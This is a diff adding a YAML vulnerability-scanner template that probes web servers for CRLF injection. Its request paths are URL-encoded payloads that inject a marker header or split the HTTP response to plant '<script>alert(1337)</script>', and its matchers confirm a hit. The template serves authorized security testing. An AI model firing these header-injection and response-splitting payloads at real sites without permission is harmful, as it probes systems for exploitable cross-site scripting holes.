@@ -1,0 +1,46 @@
+id: crlf-injection-reewardius
+
+info:
+  name: Custom CRLF Injection
+  author: reewardius
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://medium.com/@a7med.ctf/crlf-to-xss-8059ceefd349
+    - https://secinthemid.com/vulnerabilities/crlf-injection-attack/
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: crlf
+    
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0D%0AConnection:%20Location,%20close%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2055%0D%0A%0D%0A%3Cscript%3Ealert(1337)%3C/script%3E"
+      - "{{BaseURL}}/%0aDetectify:%20clrf"
+      - "{{BaseURL}}/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/2%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1337)%3C/script%3E"
+      - "{{BaseURL}}/%0d%0aDetectify:%20clrf"
+      - "{{BaseURL}}/%0dDetectify:%20clrf"
+      - "{{BaseURL}}/%2Fxxx:1%2F%0aDetectify:%20clrf"
+      - "{{BaseURL}}/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(1337)%3C/script%3E"
+      - "{{BaseURL}}/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%281337%29%3C/script%3E"
+      - "{{BaseURL}}/%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dDetectify:%20clrf"
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1337)</script>"
+          - "Detectify: clrf"
+        
+      - type: word
+        part: header
+        words:
+          - "text/html"
+          
+      - type: word
+        words:
+          - "The specified key does not exist"
+          - "Code: NoSuchKey"
+        part: body
+        negative: true
